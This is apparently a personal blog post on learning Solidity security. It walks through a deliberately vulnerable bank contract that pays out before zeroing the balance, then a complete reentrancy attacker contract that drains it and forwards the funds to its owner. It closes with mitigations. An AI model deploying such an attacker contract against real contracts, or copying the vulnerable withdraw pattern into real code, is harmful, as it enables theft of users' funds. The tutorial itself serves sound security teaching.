# My Solidity Learning Journey: Understanding Reentrancy Attacks

## Introduction

As I approach my **one-year anniversary working in the crypto industry**, I've been reflecting on the critical importance of security in decentralized finance (DeFi) and smart contracts. This reflection has been intensified by the recent **Bybit hack**, where North Korean hackers, known as the Lazarus Group, stole over **$1.5 billion** in Ethereum from the Dubai-based exchange, marking one of the largest cryptocurrency thefts to date.

This incident underscores that some of the most devastating hacks result from **simple programming mistakes**. One such vulnerability that has plagued Solidity developers is the **reentrancy attack**.

To document my learning journey transparently, I utilized ChatGPT to generate Solidity contracts and explanations, refining them through iterative feedback until I felt they were suitable for inclusion in my learning journal. If you are new to Solidity, I will walk through **each line of code** to ensure a complete understanding of how the contracts work.

## Learning Solidity by Building a Simple Bank

To grasp Solidity fundamentals, I explored a **simple bank contract** allowing users to **deposit and withdraw Ether**. Here's the initial version generated:

```solidity
// SPDX-License-Identifier: MIT
// Specifies the license type for the contract, making it easier for others to reuse legally.
pragma solidity ^0.8.0; 
// Declares that the contract is written in Solidity version 0.8.0 or higher.

// 'contract' is a Solidity keyword used to define a smart contract.
// A contract is a self-contained unit of code and data that runs on the blockchain.
contract SimpleBank {
    // Mapping to store user balances. Each address is mapped to an unsigned integer (uint256) representing its balance.
    mapping(address => uint256) public balances;

    // Function to deposit Ether into the contract.
    // The 'payable' modifier allows this function to receive Ether when called.
    function deposit() public payable {
        // msg.sender refers to the account that called this function.
        // msg.value is the amount of Ether sent with the transaction.
        balances[msg.sender] += msg.value;
    }

    // Function to withdraw funds from the contract.
    function withdraw() public {
        // Retrieve the balance of the caller.
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw"); // Ensure the caller has funds.
        
        // ⚠️ Vulnerability: The external call is made before updating the balance.
        // Transfers Ether to the caller using the `.call` method.
        // `.call` is a low-level Solidity function that sends Ether and allows execution of fallback functions.
        // It returns a boolean indicating success or failure, but does not revert on failure.
        // The empty string "" is passed as call data, meaning no function is explicitly called.
        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "Transfer failed");

        // ❌ Too late! The balance should have been updated before sending funds.
        balances[msg.sender] = 0;
    }
}
```

### How This Opens a Window for Reentrancy

1. **An external call is made before updating the balance**:
   - When `msg.sender.call{value: amount}("")` executes, it sends Ether to `msg.sender`.
   - If `msg.sender` is an externally owned account (EOA, a normal wallet), the transaction completes normally.
   - However, if `msg.sender` is a **smart contract**, Solidity automatically triggers a special function in that contract, known as a **fallback function**.

2. **What is a fallback function?**
   - A fallback function is a special function in a Solidity smart contract that executes when the contract **receives Ether without any specific function being called**.
   - It is often used to handle direct transfers of Ether and can also execute arbitrary logic when triggered.
   - If a contract has a function named `receive()` or a generic `fallback()` function, that function will **run automatically** when Ether is sent to the contract.

3. **A malicious contract can exploit this behavior**:
   - Instead of just receiving Ether, a contract receiving funds **can execute additional code** in its fallback function.
   - If this malicious contract calls `withdraw()` again inside its fallback function, it can withdraw multiple times in a loop **before the balance updates**.

## Understanding the Reentrancy Attack

### The Attacker’s Malicious Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 'interface' is a Solidity keyword used to define a contract's external functions without implementation.
// Interfaces allow interaction with other contracts by specifying the function signatures they expose.
interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

// Attack contract designed to exploit the vulnerable contract.
contract ReentrancyAttacker {
    IVulnerable public target; // Stores the address of the vulnerable contract.
    address public owner; // Stores the attacker's address.

    constructor(address _target) {
        target = IVulnerable(_target); // Assigns the target contract.
        owner = msg.sender; // Sets the attacker's address.
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw(); // Starts the reentrancy process.
    }

    // The fallback function is triggered when this contract receives Ether.
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(); // 🚨 Calls withdraw recursively before balance updates.
        } else {
            payable(owner).transfer(address(this).balance); // Sends stolen funds to the attacker.
        }
    }
}
```

## Summary and Conclusion

This deep dive into reentrancy attacks has shown how a simple **ordering mistake** in Solidity code can lead to a devastating vulnerability. 

### Key Takeaways:
- **Reentrancy occurs when an external call is made before updating internal state**, allowing a malicious contract to re-enter and execute unintended function calls.
- **Fallback functions allow contracts to execute arbitrary logic when receiving Ether**, which attackers can exploit to repeatedly drain a vulnerable contract.
- **The Checks-Effects-Interactions pattern mitigates reentrancy attacks by ensuring that state updates happen before external calls.**
- **Using OpenZeppelin’s `ReentrancyGuard` is another effective way to prevent reentrant calls.**

Understanding and mitigating vulnerabilities like **reentrancy** is crucial for writing secure Solidity contracts. **Security must be an integral part of smart contract development, not an afterthought.**

### Next Steps

Moving forward, I plan to explore **integer overflows, front-running, and other Solidity security vulnerabilities**, continuing my journey of learning how to write robust and secure smart contracts.
